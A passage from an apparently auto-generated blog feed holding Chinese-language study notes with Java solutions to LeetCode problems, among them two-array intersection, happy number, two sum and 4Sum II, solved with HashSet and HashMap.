4交换，此时很难不想到借用中间变量实现，不用递归实现【每次单独处理头节点】更优雅.<br>注意5后面是空指针就不用交换<br>判断next.next不为空是为了防止空指针异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> dummy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (prev.next != <span class="literal">null</span> &amp;&amp; prev.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> head.next.next; <span class="comment">// 缓存 next</span></span><br><span class="line">      prev.next = head.next;          <span class="comment">// 将 prev 的 next 改为 head 的 next</span></span><br><span class="line">      head.next.next = head;          <span class="comment">// 将 head.next(prev.next) 的next，指向 head</span></span><br><span class="line">      head.next = temp;               <span class="comment">// 将head 的 next 接上缓存的temp</span></span><br><span class="line">      prev = head;                    <span class="comment">// 步进1位</span></span><br><span class="line">      head = head.next;               <span class="comment">// 步进1位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;反转链表&quot;&gt;&lt;a href=&quot;#反转链表&quot; class=&quot;headerlink&quot; title=&quot;反转链表&quot;&gt;&lt;/a&gt;反转链表&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/reverse-linked-list</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x8</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x8/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x8/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:30:18.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="两个数组的交集"><a href="#两个数组的交集" class="headerlink" title="两个数组的交集"></a>两个数组的交集</h3><p>link：<a href="https://leetcode.cn/problems/intersection-of-two-arrays/">349. 两个数组的交集 - 力扣（LeetCode）</a></p><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>首先想到合并两个数组，遍历找重复项存储到新的数组中但其实用HashSet是更加方便的,【HashSet不存在重复数据】</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241012004357257.png" alt="image-20241012004357257"><br>**注意：使用数组做哈希表的题目都限制了大小 例如只有小写字母或者数值大小在【0-1000】内 **</p><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建需要的set表 set2用于返回结果</span></span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; set2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历数组1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)  &#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历ser1映射的元素判断哈希表中是否存在对应元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i)) &#123;</span><br><span class="line">                set2.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将结果集合转换为数组</span></span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[set2.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : set2) &#123;</span><br><span class="line">            result[k++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h6><p>更高级的写法 Java8引入的流式API（Stream API）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//将结果集合转换为数组</span></span><br><span class="line"><span class="keyword">return</span> set2.stream().mapToInt(x -&gt; x).toArray();</span><br></pre></td></tr></table></figure><p>**<code>stream()</code>**：将集合转换为流对象，便于对集合进行链式操作.<br>**<code>mapToInt(x -&gt; x)</code>**：将流中的每个 <code>Integer</code> 元素转换为 <code>int</code> 类型（自动拆箱).<br>**<code>toArray()</code>**：将流中的元素收集为一个 <code>int[]</code> 数组.</p><h5 id="Hash数组"><a href="#Hash数组" class="headerlink" title="Hash数组"></a>Hash数组</h5><p>思路相同 只不过加了大小限制之后可以用Hash数组解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="comment">//创建需要的两个数组  </span></span><br><span class="line">        <span class="type">int</span>[] hash1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="type">int</span>[] hash2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="comment">//分别遍历两个数组 对相同元素出现次数计数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1) &#123;</span><br><span class="line">            hash1[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            hash2[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//相同的下标位置都大于0 满足</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span>(hash1[i] &gt; <span class="number">0</span> &amp;&amp; hash2[i] &gt; <span class="number">0</span>)</span><br><span class="line">            result.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换成数组</span></span><br><span class="line">        <span class="type">int</span>[] finalArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : result) &#123;</span><br><span class="line">            finalArray[index++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> finalArray;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><h3 id="快乐数"><a href="#快乐数" class="headerlink" title="快乐数"></a>快乐数</h3><p>link：<a href="https://leetcode.cn/problems/happy-number/description/">202. 快乐数 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>起初分析的时候被卡在了循环条件处【😓】，首先得不是1然后不满足快乐数条件最后不被包含在Hashset中.【是的没错是高贵的Hashset（bushi）】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">//创建所需的set表</span></span><br><span class="line">        Set&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//循环判断 按除每一位判断</span></span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">1</span> &amp;&amp; !result.contains(n)) &#123;</span><br><span class="line">            result.add(n);</span><br><span class="line">            <span class="comment">//getNumber函数单独模拟实现</span></span><br><span class="line">            n = getNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//逐位进行平方求和判断</span></span><br><span class="line">            <span class="keyword">while</span>(n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">                res += tmp * tmp;</span><br><span class="line">                n = n / <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h6><p> <strong>所有由此观之，所有判断元素是否出现过的题目都可以用哈希法解决.</strong><br><strong>一般哈希表都是用来快速判断一个元素是否出现集合里.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;两个数组的交集&quot;&gt;&lt;a href=&quot;#两个数组的交集&quot; class=&quot;headerlink&quot; title=&quot;两个数组的交集&quot;&gt;&lt;/a&gt;两个数组的交集&lt;/h3&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/interse</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x9</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x9/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x9/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:24:28.290Z</updated>
    
    <content type="html"><![CDATA[<h4 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h4><p>link：<a href="https://leetcode.cn/problems/two-sum/description/">1. 两数之和 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看到题目描述首先想到用两层for循环解决问题.<br>分别从i位置和j(i+1)位置开始相加遍历判断.<br><strong>注意不越界条件</strong></p><h6 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="comment">//我们要找到2个数之和等于target</span></span><br><span class="line">        <span class="comment">//即我们需要找到nums[i] + nums[j] == target，并且返回他们的下标（i和j），其中i != j</span></span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>]; <span class="comment">//声明一个大小为2的数组用来保存结果</span></span><br><span class="line">        <span class="comment">//我们通过循环来遍历所有的数字</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;  <span class="comment">//用一个变量n保存nums的长度</span></span><br><span class="line">        <span class="comment">//i为第一个数的下标，nums一共有n个数，所以i的取值范围是[0, n-1]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="comment">//j为第二个数的下标。</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">                <span class="comment">//对于每个数nums[i]，我们验证一遍其他数（nums[j]）跟它的和是否等于target</span></span><br><span class="line">                <span class="comment">//如果满足条件</span></span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                    <span class="comment">//将下标写入返回值数组里</span></span><br><span class="line">                    ans[<span class="number">0</span>] = i;</span><br><span class="line">                    ans[<span class="number">1</span>] = j;</span><br><span class="line">                    <span class="comment">//返回</span></span><br><span class="line">                    <span class="keyword">return</span> ans;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//默认返回值</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h6><p><strong>Tips</strong><br><strong>当我们查询一个元素是否出现过或者一个元素是否在集合里时，首先要想到哈希法.</strong></p><p>之前了解到哈希数组的运用是受到大小的限制，如果元素过少会浪费内存空间.<br>set是一个集合，存储的元素只能是一个key.本题不仅要判断y是否存在还要记录y的位置，不适用.</p><p>我们需要一个集合存储我们遍历的元素，对应的key值和value值分别存放元素和下标.(HasMap)</p><h6 id="map的作用"><a href="#map的作用" class="headerlink" title="map的作用"></a>map的作用</h6><p>起到存储的作用，存储我们遍历的数组数据元素和对应下标.<br>遍历数组的时候只需要查询是否有与当前元素匹配的元素即可.【匹配规则target-key &#x3D;&#x3D; nownumber】<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110249454.png" alt="image-20241014110249454"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110319990.png" alt="image-20241014110319990"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110336307.png" alt="image-20241014110336307"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="comment">//创建最终输出的数组</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="comment">//排除特殊情况</span></span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建需要的Map</span></span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(tmp)) &#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                res[<span class="number">0</span>] = map.get(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取key对应的value</span></span><br><span class="line">            map.put(nums[i],i);</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashmap.get(Object key)</span><br><span class="line"><span class="comment">//get方法获取指定key的value</span></span><br><span class="line">hashmap.put（K key，V value）</span><br><span class="line"><span class="comment">//将键值对添加到HashMap中</span></span><br></pre></td></tr></table></figure><h4 id="四数之和"><a href="#四数之和" class="headerlink" title="四数之和"></a>四数之和</h4><p>link：<a href="https://leetcode.cn/problems/4sum-ii/description/">454. 四数相加 II - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先看到四数加和，很容易想到两两分组遍历分别求和.利用map中key和value分别存储两个数组元素之和以及出现的次数（value）最后利用两两打足求和之后加法原则a+b（A）+ c+d（B）&#x3D; 0，0 - B &#x3D; A，如果A在map中出现过，就用定义的计数器count吧map中key对应的value统计出来最后返回count即可.【出现过几次就有几组】</p><h6 id="HashMap-1"><a href="#HashMap-1" class="headerlink" title="HashMap"></a>HashMap</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">       <span class="comment">//首先创建需要的Map</span></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建sum和res</span></span><br><span class="line">        <span class="type">int</span> sum,res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//求a、b(A)数组之和</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1) &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j : nums2)&#123;</span><br><span class="line">                sum = i + j;</span><br><span class="line">                <span class="comment">//如果tmp已经在map中存储过 value+1更新存储</span></span><br><span class="line">                <span class="comment">//put存储键值对 get获取value值</span></span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(sum)) &#123;</span><br><span class="line">                    map.put(sum,map.get(sum) + <span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//第一次出现在map中value为1</span></span><br><span class="line">                    map.put(sum,<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">//求c、d(B)两数组之和并根据逻辑公式检查A数组中是否存在对应数值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums3) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j : nums4)&#123;</span><br><span class="line">                sum = i + j;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(<span class="number">0</span> - sum)) &#123;</span><br><span class="line">                    res += map.get(<span class="number">0</span> - sum);</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="补充getOrDefault"><a href="#补充getOrDefault" class="headerlink" title="补充getOrDefault()"></a>补充getOrDefault()</h6><p>getOrDefault() 方法获取指定 key 对应对 value，如果找不到 key ，则返回设置的默认值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashmap.getOrDefault(Object key, V defaultValue)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j:nums2)</span><br><span class="line">            &#123;</span><br><span class="line">                sum = i+j;</span><br><span class="line">                map.put(sum,map.getOrDefault(sum,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums3)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j :nums4)</span><br><span class="line">            &#123;</span><br><span class="line">               sum = i + j;</span><br><span class="line">               res+=map.getOrDefault(<span class="number">0</span>-sum,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;两数之和&quot;&gt;&lt;a href=&quot;#两数之和&quot; class=&quot;headerlink&quot; title=&quot;两数之和&quot;&gt;&lt;/a&gt;两数之和&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/two-sum/description</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
</feed>
